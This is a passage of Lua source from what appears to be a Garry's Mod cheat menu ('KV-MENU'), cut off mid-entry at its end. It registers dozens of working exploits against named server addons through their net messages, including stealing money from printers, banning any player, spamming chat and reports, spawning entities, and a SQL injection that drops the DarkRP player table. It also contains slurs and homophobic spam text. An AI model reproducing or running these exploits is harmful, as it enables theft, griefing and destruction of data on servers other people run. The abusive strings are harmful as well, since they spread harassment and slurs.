                net.WriteEntity(KV.GetLP())
                net.WriteEntity(v)
                net.WriteInt(2, 16)
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Printer Money Stealer", {
    desc = "Instantly jew all money from every bitminer on the server",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("BM2.Command.SellBitcoins") end,
    hooks = {
        Tick = function(tbl, sploit)
            if KV.TIME_TO_TICKS(KV.REAL_CURTIME) % (KV.SafeToNumber(KV.GetStored("stealer1cooldown", 1)) + 1) == 0 then
                for k, v in ipairs(KV.ents.FindByGlobal("GetIsMining")) do
                    KV.NetStart(sploit, "BM2.Command.SellBitcoins")
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Cooldown",
            min = 0,
            max = KV.TICK_RATE,
            default = 1,
            addr = "stealer1cooldown"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("fg_printer_money") end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(KV.ents.FindByGlobal("Getdata_money")) do
                KV.NetStart(sploit, "fg_printer_money")
                net.WriteEntity(v)
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("icemod_printer_withdraw") end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(KV.ents.FindByGlobal("PrinterMenu")) do
                KV.NetStart(sploit, "icemod_printer_withdraw")
                net.WriteEntity(v)
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Printer Exploit", {
    desc = "Edit the stats of any printer in the server",
    severity = 65,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("lithiumPrinter2") end,
    count = {
        ["Active"] = 3,
        ["Total"] = 3,
    },
    hooks = {
        Think = function(tbl, sploit)
            local ent = KV.GetStored("px_ply", {})[1]

            if IsValid(ent) and istable(ent.data) then
                KV.OpenTableEditor(KV.Menu, ent.data, "Printer Stats", function(tbl)
                    KV.NetStart(sploit, {"lithiumPrinter2Bronze", "lithiumPrinter2Economic", "lithiumPrinter2Iron", "lithiumPrinter2Silver", "lithiumPrinter2Obsidian", "lithiumPrinter2Donator"}, true)

                    net.WriteEntity(ent)
                    net.WriteTable(tbl)
                    net.SendToServer()
                end)
            end
        end,
    },
    functions = {
        {
            typ = "entity",
            addr = "px_ply",
            Name = "Printer",
            tbl = function() return KV.ents.FindByGlobal("data") end
        },
        {
            typ = "func",
            Name = "Edit",
        },
    },
})

KV.AddExploit("Printer Exploit", {
    desc = "Edit the shelves of any printer in the server",
    severity = 65,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("lithiumPrinter2") end,
    count = {
        ["Active"] = 2,
        ["Total"] = 2,
    },
    hooks = {
        Think = function(tbl, sploit)
            local ent = KV.GetStored("px2_ply", {})[1]

            if IsValid(ent) and istable(ent.shelves) then
                KV.OpenTableEditor(KV.Menu, ent.shelves, "Printer Shelves", function(tbl)
                    KV.NetStart(sploit, {"lithium_printers_connected", "lithiumPrinters2RackLarge"}, true)

                    net.WriteEntity(ent)
                    net.WriteTable(tbl)
                    net.SendToServer()
                end)
            end
        end,
    },
    functions = {
        {
            typ = "entity",
            addr = "px2_ply",
            Name = "Printer",
            tbl = function() return KV.ents.FindByGlobal("shelves") end
        },
        {
            typ = "func",
            Name = "Edit",
        },
    },
})

--////////////////////////////////////////////- SPAM -////////////////////////////////////////////////
KV.AddExploit("Chat Spam", {
    desc = "Spams specific players on the server with a message",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 10,
    scan = function() return KV.ValidNetString("sendtable") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("fr_players", {})) do
                if not IsValid(v) then continue end
                local buyit = {}

                for i = 1, 15 do
                    buyit[#buyit + 1] = KV.GetStored("fr_spamstring", "GET KV-MENU")
                end

                KV.NetStart(sploit, "sendtable")
                net.WriteEntity(v)
                net.WriteTable(buyit)
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Enter a message",
            default = "GET KV-MENU",
            addr = "fr_spamstring"
        },
        {
            typ = "players",
            addr = "fr_players"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Chat Spam", {
    desc = "Spam private messages to anyone",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = function(sploit) return #KV.GetStored("spammer_plyz", {}) end,
    times_per_tick = math.huge,
    vars = {},
    scan = function()
        local psay, query = KV.RecursiveGetVar(ulx, {"psay"}, "function"), KV.RecursiveGetVar(ULib, {"ucl", "query"}, "function")

        return psay and query and query(KV.GetLP(), "ulx psay")
    end,
    hooks = {
        Think = function(tbl, sploit)
            if KV.GetLP().ulib_threat_level then
                KV.GetLP().ulib_threat_level = 0
            end

            for k, v in ipairs(KV.GetStored("spammer_plyz", {})) do
                if not IsValid(v) then continue end
                local spamstr = KV.GetStored("spam_message", "KV-MENU")
                KV.RCC(sploit, "ulx", "psay", v:Nick(), spamstr)
            end
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Spam Message",
            default = "KV-MENU",
            addr = "spam_message"
        },
        {
            typ = "players",
            addr = "spammer_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Chat Spam", {
    desc = "Spam admin messages",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = function(sploit) return #KV.GetStored("spamasay_plyz", {}) end,
    times_per_tick = math.huge,
    vars = {},
    scan = function()
        local asay, query = KV.RecursiveGetVar(ulx, {"asay"}, "function"), KV.RecursiveGetVar(ULib, {"ucl", "query"}, "function")

        return asay and query and query(KV.GetLP(), "ulx asay")
    end,
    hooks = {
        Think = function(tbl, sploit)
            if KV.GetLP().ulib_threat_level then
                KV.GetLP().ulib_threat_level = 0
            end

            local spamstr = KV.GetStored("spam2_message", "KV-MENU")
            KV.RCC(sploit, "ulx", "asay", spamstr)
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Spam Message",
            default = "KV-MENU",
            addr = "spam2_message"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Chat Spam", {
    desc = "Set ALL taxes to 0 and spam notifies",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return KV.ValidNetString("BEModule_SetTaxes") and BEModuleConfig and BEModuleConfig.EnableTaxes end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "BEModule_SetTaxes")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Chat Spam", {
    desc = "Spam chat messages for everyone (except KV users)",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    vars = {},
    scan = function() return KV.ValidNetString("DrGBaseChatPrint") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "DrGBaseChatPrint")
            net.WriteString(KV.GetStored("chatspam4", "GET KV-MENU"))
            net.WriteBool(sploit.bools.error or false)
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if strName == "DrGBaseChatPrint" then return false end
            end,
        },
    },
    functions = {
        {
            typ = "string",
            Name = "Spam Message",
            default = "GET KV-MENU",
            addr = "chatspam4"
        },
        {
            typ = "bool",
            ToggleText = {"Error"},
            border = true,
            bool = "error"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Report Exploit", {
    desc = "Spam reports on everybody on the server",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("TransferReport") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(player.GetAll()) do
                KV.NetStart(sploit, "TransferReport")
                net.WriteString(v:SteamID())
                net.WriteString("INFERNUS AND BAT ARE FAGGOTS FOR EACH OTHER")
                net.WriteString("DITCH THIS SHITTY SERVER AND BUY ODIUM.PRO TODAY")
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Report Everybody",
        },
    },
})

--[[KV.ChatClear = KV.LAST.ChatClear || _G.ChatClear
KV.AddExploit( "Chat Spam", {
    desc = "Chat will clear and become unusable. (patched on some custom chatboxes)",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return pcall(function() require("cc") end) && istable(KV.ChatClear || _G.ChatClear) end,
    initial = function()
        if(!KV.ChatClear) then
            KV.ChatClear = _G.ChatClear
        end
        if(_G.ChatClear) then
            _G.ChatClear = nil
        end
    end,
    hooks = {
        Think = function(tbl, sploit)
            if(KV.ChatClear) then if(DarkRP) then KV.ChatClear.OOC() else KV.ChatClear.Run() end end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )]]
KV.AddExploit("Team Change Spammer", {
    desc = "Chat will spam with team changes",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = function(sploit)
        local tbl = KV.RecursiveGetVar(sploit, {"vars", "Think", "team"}, "table", true)

        KV.SetTableContents(tbl, KV.GetVarTable(team.GetAllTeams(), "Joinable", KV.TYPEVARS.EQUALTO, true))

        return #tbl
    end,
    times_per_tick = math.huge,
    vars = {},
    scan = function() return KV.GetLP().pkdata ~= nil end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.RecursiveGetVar(sploit, {"vars", "Think", "team"}, "table", true)) do
                if v.Joinable == true then
                    KV.RCC(sploit, "_team", tostring(k))
                end
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Respawn Exploit", {
    desc = "Instantly respawn on death, skip respawn timer",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.GetLP().pkdata ~= nil end,
    hooks = {
        entity_killed = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Entity(data.entindex_killed)

            if ent == KV.GetLP() then
                for k, v in ipairs(team.GetAllTeams()) do
                    if v.Joinable == true and k ~= KV.GetLP():Team() then
                        KV.RCC(sploit, "_team", tostring(k))
                        break
                    end
                end
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

--[[KV.AddExploit( "Respawn Exploit", {
    desc = "Instantly respawn on death",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("recreate_move") end,
    hooks = {
        entity_killed = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Entity(data.entindex_killed)
            if ( ent == KV.GetLP() ) then
                KV.NetStart(sploit, "recreate_move")
                net.WriteVector(KV.GetLP():GetPos())
                net.WriteAngle(KV.GetLP():GetAngles())
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )]]
--TRASH
KV.AddExploit("Console Spam", {
    desc = "Supposed to be a lagsploit but doesn't actually cause lag, just spams console",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 20,
    scan = function() return ULib ~= nil end,
    hooks = {
        Think = function(tbl, sploit)
            KV.RCC(sploit, "_u", KV.GetStored("consolespam1", "GET KV-MENU"))
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Spam Message",
            default = "GET KV-MENU",
            addr = "consolespam1"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Chat Spam", {
    desc = "Big chat spams, extremely annoying",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("VJSay") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(player.GetAll()) do
                KV.NetStart(sploit, "VJSay")
                net.WriteEntity(v)
                net.WriteString(KV.GetStored("vj_spamstring", "GET KV-MENU"))

                if KV.GetStored("vj_spamsound", "") ~= "" then
                    net.WriteString(KV.GetStored("vj_spamsound", ""))
                end

                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Enter a message",
            default = "GET KV-MENU",
            addr = "vj_spamstring"
        },
        {
            typ = "string",
            Name = "Enter a sound path",
            default = "vo/npc/male01/hacks01.wav",
            addr = "vj_spamsound"
        },
        {
            typ = "bool",
        },
    },
})

--////////////////////////////////////////////- HARM -////////////////////////////////////////////////
KV.AddExploit("Ban Exploit", {
    desc = "Allows you to ban anyone regardless of rank",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 3,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("banleaver") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("banleaver_ply", {})) do
                if IsValid(v) then
                    if v:IsPlayer() then
                        KV.NetStart(sploit, "banleaver")
                        net.WriteString(tostring(v:SteamID() .. "{sep}" .. tostring(v:Name())))
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "banleaver_ply"
        },
        {
            typ = "bool",
            Name = "Ban",
            args = {},
        },
    },
})

KV.AddExploit("Ban Exploit", {
    desc = "Allows you to ban anyone regardless of rank",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("gBan.BanBuffer") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("ban2_ply", {})) do
                if IsValid(v) then
                    if v:IsPlayer() then
                        KV.NetStart(sploit, "gBan.BanBuffer")
                        net.WriteBool(true)
                        net.WriteInt(KV.SafeToNumber(KV.GetStored("ban2time", 0)), 32)
                        net.WriteString(KV.GetStored("ban2", "GET KV-MENU"))
                        net.WriteString(v:SteamID())
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "ban2_ply"
        },
        {
            typ = "string",
            Name = "Ban Reason",
            default = "GET KV-MENU",
            addr = "ban2"
        },
        {
            typ = "float",
            Name = "Ban Time",
            min = 0,
            max = (math.pow(2, 32) - 1) / 2,
            default = 0,
            addr = "ban2time"
        },
        {
            typ = "bool",
            Name = "Ban",
            args = {},
        },
    },
})

KV.AddExploit("Ban Exploit", {
    desc = "Allows you to ban anyone regardless of rank",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("RDMAssign") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("ban3_ply", {})) do
                if IsValid(v) then
                    if v:IsPlayer() then
                        for i = 1, 10 do
                            KV.NetStart(sploit, "RDMAssign")
                            net.WriteEntity(v)
                            net.SendToServer()
                        end
                    end
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "ban3_ply"
        },
        {
            typ = "func",
            Name = "Do it"
        },
    },
})

KV.AddExploit("Break The Server", {
    desc = "Vandalize the DarkRP master SQL database, permanently erasing all DarkRP player data",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return KV.ValidNetString("pplay_sendtable", "pplay_deleterow") and cl_PPlay end,
    hooks = {
        Think = function(tbl, sploit)
            local ass = {}
            ass.tblname = "darkrp_player; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
            ass.ply = KV.GetLP()
            KV.NetStart(sploit, "pplay_sendtable")
            net.WriteTable(ass)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Burn it down",
        },
    },
})

KV.AddExploit("Break The Server", {
    desc = "Will cause a nuclear implosion",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("MDE_RemoveStuff_C2S") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.ents.FindByGlobal("")) do
                KV.NetStart(sploit, "MDE_RemoveStuff_C2S")

                net.WriteTable({
                    DATA = "",
                    TARGET = v
                })

                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Burn it down",
        },
    },
})

KV.AddExploit("Break The Server", {
    desc = "Will cause a nuclear implosion",
    severity = 100,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("timebombDefuse") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.ents.FindByGlobal("")) do
                KV.NetStart(sploit, "timebombDefuse")
                net.WriteEntity(v)
                net.WriteBool(true)
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Burn it down",
        },
    },
})

KV.AddExploit("Break The Server", {
    desc = "Irreversibly break the physics engine",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("dialogAlterWeapons") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "dialogAlterWeapons", true)
            net.WriteString("Add")

            net.WriteTable({
                [1] = "worldspawn"
            })

            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Burn it down",
        },
    },
})

KV.AddExploit("Cuff Breaker", {
    desc = "Instantly break out of handcuffs",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("Kun_ZiptieStruggle") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "Kun_ZiptieStruggle")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Cuff Breaker", {
    desc = "Automatically break out of handcuffs",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return isfunction(KV.GetLP().IsHandcuffed) end,
    hooks = {
        CreateMove = function(tbl, sploit, varargs)
            local cmd = varargs[1]

            if KV.GetLP().IsHandcuffed(KV.GetLP()) then
                if cmd:TickCount() % 2 == 0 then
                    cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK))
                end
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Cuff Breaker", {
    desc = "Instantly break out of handcuffs",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("realistic_hook BreakFree") end,
    hooks = {
        CreateMove = function(tbl, sploit, varargs)
            local cmd = varargs[1]
            local target_ents = KV.GetVarTable(ents.GetAll(), "GetTargetEnt", KV.TYPEVARS.EQUALTO, KV.GetLP())

            if target_ents[1] then
                if cmd:TickCount() % 2 == 0 then
                    cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_USE))
                end
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Cuff Breaker", {
    desc = "Instantly break out of handcuffs",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return isfunction(KV.GetLP().IsHandcuffed) and KV.ValidNetString("dialogAlterWeapons") end,
    hooks = {
        Think = function(tbl, sploit)
            if KV.GetLP():IsHandcuffed() then
                KV.NetStart(sploit, "dialogAlterWeapons", true)
                net.WriteString("Remove")

                net.WriteTable({
                    [1] = "weapon_handcuffed"
                })

                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Entity Exploit", {
    desc = "Unfreeze any entity",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("zrush_FuelSplitUIGotClosed_net") end,
    hooks = {
        CreateMove = function(tbl, sploit, varargs)
            local tbl = KV.RecursiveGetVar(sploit, {"bools"}, "table", true)

            if tbl.enabled then
                local ent = KV.GetLP():GetEyeTrace().Entity

                if IsValid(ent) and varargs[1]:KeyDown(IN_ATTACK) then
                    KV.NetStart(sploit, "zrush_FuelSplitUIGotClosed_net")
                    net.WriteFloat(ent:EntIndex())
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Entity Exploit", {
    desc = "Give yourself any entity",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("CRAFTINGMOD_INVENTORY") end,
    hooks = {
        Think = function(tbl, sploit)
            local vars = KV.RecursiveGetVar(sploit, {"vars"}, "table", true)

            if not vars.NAME then
                local ItemsList = KV.RecursiveGetVar(CRAFTINGMOD, {"ITEMS", "GetItemsList"}, "function")

                if ItemsList then
                    for k, v in pairs(ItemsList(CRAFTINGMOD.ITEMS)) do
                        if not v.LoadData then
                            vars.NAME = v.NAME
                            break
                        end
                    end
                end
            end

            for i = 1, KV.GetStored("entity1_q") do
                KV.NetStart(sploit, "CRAFTINGMOD_INVENTORY", true)

                net.WriteTable({
                    type = 6,
                    ENTITY = KV.GetStored("entity1"),
                    SKIN = 0,
                    MODEL = KV.GetStored("entity1_m"),
                    NAME = vars.NAME or "Beer"
                })

                net.WriteInt(0, 16)

                net.WriteString(tostring(KV.RecursiveGetVar(CRAFTINGMOD, {"PANELS", "Inventory_ID"}, "string") or 0))

                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Entity Class",
            default = "sent_ball",
            addr = "entity1"
        },
        {
            typ = "string",
            Name = "Entity Model",
            default = "models/error.mdl",
            addr = "entity1_m"
        },
        {
            typ = "float",
            addr = "entity1_q",
            Name = "Amount",
            min = 1,
            max = KV.RecursiveGetVar(_G, {"CRAFTINGMOD", "Config", "PropLimit"}, "number") or math.huge,
            default = 1
        },
        {
            typ = "func",
            Name = "Give me shit",
        },
    },
})

KV.AddExploit("Entity Exploit", {
    desc = "With just a wave of my magic wand...",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("STOOL_FISHSPOT_REMOVE") end,
    hooks = {
        net = {
            SendToServer = function(sploit, varargs, func)
                func(unpack(varargs))

                if sploit.bools.enabled and KV.NetOutgoingMsg == "properties" and istable(KV.NetOutgoingData[1]) and KV.NetOutgoingData[1][1] == KV.GetStored("util_jack1", "remove") then
                    KV.NetStart(sploit, "STOOL_FISHSPOT_REMOVE")
                    net.WriteEntity(Entity(KV.NetOutgoingData[2][1]))
                    net.SendToServer()
                end

                return false
            end,
        },
    },
    --[[_G = {
            SortedPairsByMemberValue = function(sploit, varargs, func)
                local PropertyList = varargs[1]
                if(istable(PropertyList) && PropertyList["remove"] && PropertyList["remove"]["Filter"] && sploit.bools.enabled) then
                    local tbl = table.Copy(PropertyList)
                    tbl["remove"]["Filter"] = function() return true end
                    return func(unpack(varargs))
                end
            end,
        },]]
    functions = {
        {
            typ = "string",
            Name = "Utility",
            default = "remove",
            addr = "util_jack1"
        },
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Entity Exploit", {
    desc = "Some disassembly required",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("DestroyTable") end,
    hooks = {
        net = {
            SendToServer = function(sploit, varargs, func)
                func(unpack(varargs))

                if sploit.bools.enabled and KV.NetOutgoingMsg == "properties" and istable(KV.NetOutgoingData[1]) and KV.NetOutgoingData[1][1] == KV.GetStored("util_jack2", "remove") then
                    KV.NetStart(sploit, "DestroyTable")
                    net.WriteEntity(Entity(KV.NetOutgoingData[2][1]))
                    net.SendToServer()
                end

                return false
            end,
        },
    },
    functions = {
        {
            typ = "string",
            Name = "Utility",
            default = "remove",
            addr = "util_jack2"
        },
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Entity Exploit", {
    desc = "Set your playermodel to anything",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("SetPlayerModel") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "SetPlayerModel")
            net.WriteString(KV.GetStored("entity2_m"))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Model",
            default = "models/error.mdl",
            addr = "entity2_m"
        },
        {
            typ = "func",
            Name = "Do it",
        },
    },
})

KV.AddExploit("Entity Exploit", {
    desc = "Take a sip from the cup of destruction",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("AS_DoAttack") end,
    hooks = {
        net = {
            SendToServer = function(sploit, varargs, func)
                func(unpack(varargs))

                if sploit.bools.enabled and KV.NetOutgoingMsg == "properties" and istable(KV.NetOutgoingData[1]) and KV.NetOutgoingData[1][1] == KV.GetStored("util_jack3", "remove") then
                    KV.NetStart(sploit, "AS_DoAttack")

                    net.WriteTable({
                        Weapon = Entity(KV.NetOutgoingData[2][1]):EntIndex(),
                        Target = 0
                    })

                    net.SendToServer()
                end

                return false
            end,
        },
    },
    functions = {
        {
            typ = "string",
            Name = "Utility",
            default = "remove",
            addr = "util_jack3"
        },
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Entity Exploit", {
    desc = "Give yourself any entity",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("dialogAlterWeapons") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(string.Split(KV.GetStored("entity2", "sent_ball"), ",")) do
                for i = 1, KV.GetStored("entity2_q") do
                    KV.NetStart(sploit, "dialogAlterWeapons", true)
                    net.WriteString("Add")

                    net.WriteTable({
                        [1] = v
                    })

                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Entity Class",
            default = "sent_ball",
            addr = "entity2"
        },
        {
            typ = "float",
            addr = "entity2_q",
            Name = "Amount",
            min = 1,
            max = math.huge,
            default = 1
        },
        {
            typ = "func",
            Name = "Give me shit",
        },
    },
})

KV.AddExploit("Entity Exploit", {
    desc = "Spawn any inventory item",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function()
        local ret = KV.ValidNetString("InvSV") and istable(Items)

        if ret then
            for k, v in pairs(Items) do
                v.ClassName = k
            end
        end

        return ret
    end,
    hooks = {
        Think = function(tbl, sploit)
            for i = 1, KV.GetStored("entity3_q") do
                KV.NetStart(sploit, "InvSV", true)
                net.WriteTable({})
                net.WriteString("DropItem")
                net.WriteString(KV.GetStored("entity3", "")[1])
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "combo",
            Name = "Entity",
            tbl = Items,
            var = "ClassName",
            sort = "ClassName",
            default = {},
            addr = "entity3"
        },
        {
            typ = "float",
            addr = "entity3_q",
            Name = "Amount",
            min = 1,
            max = math.huge,
            default = 1
        },
        {
            typ = "func",
            Name = "Spawn",
        },
    },
})

KV.AddExploit("Entity Exploit", {
    desc = "Become invisible",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    general_override = true,
    scan = function() return KV.ValidNetString("camo_PlayerInvis") end,
    OnEnable = function(var, sploit)
        if var ~= "invisible" then return end
        KV.NetStart(sploit, "camo_PlayerInvis", true)
        net.WriteBool(true)
        net.SendToServer()
    end,
    OnDisable = function(var, sploit)
        if var ~= "invisible" then return end
        KV.NetStart(sploit, "camo_PlayerInvis", true)
        net.WriteBool(false)
        net.SendToServer()
    end,
    functions = {
        {
            typ = "bool",
            ToggleText = {"Cloak"},
            border = true,
            bool = "invisible"
        },
    },
})

KV.AddExploit("Movement Exploit", {
    desc = "My name is Barry Allen...",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return KV.ValidNetString("XMH_RunOneLineLua") end,
    count = {
        ["Active"] = 3,
        ["Total"] = 3,
    },
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "XMH_RunOneLineLua")
            net.WriteString("xmh_walkspeed_var")
            net.WriteInt(KV.GetStored("dbx_wlk"), 16)
            net.SendToServer()
            KV.NetStart(sploit, "XMH_RunOneLineLua")
            net.WriteString("xmh_runspeed_var")
            net.WriteInt(KV.GetStored("dbx_run"), 16)
            net.SendToServer()
            KV.NetStart(sploit, "XMH_RunOneLineLua")
            net.WriteString("xmh_jumpheight_var")
            net.WriteInt(KV.GetStored("dbx_jmp"), 16)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Walk Speed",
            min = 1,
            max = math.floor(2 ^ 16 / 2) - 1,
            default = 160,
            addr = "dbx_wlk"
        },
        {
            typ = "float",
            Name = "Run Speed",
            min = 1,
            max = math.floor(2 ^ 16 / 2) - 1,
            default = 240,
            addr = "dbx_run"
        },
        {
            typ = "float",
            Name = "Jump Height",
            min = 1,
            max = math.floor(2 ^ 16 / 2) - 1,
            default = 200,
            addr = "dbx_jmp"
        },
        {
            typ = "func",
            Name = "Do it"
        },
    },
})

KV.AddExploit("Movement Exploit", {
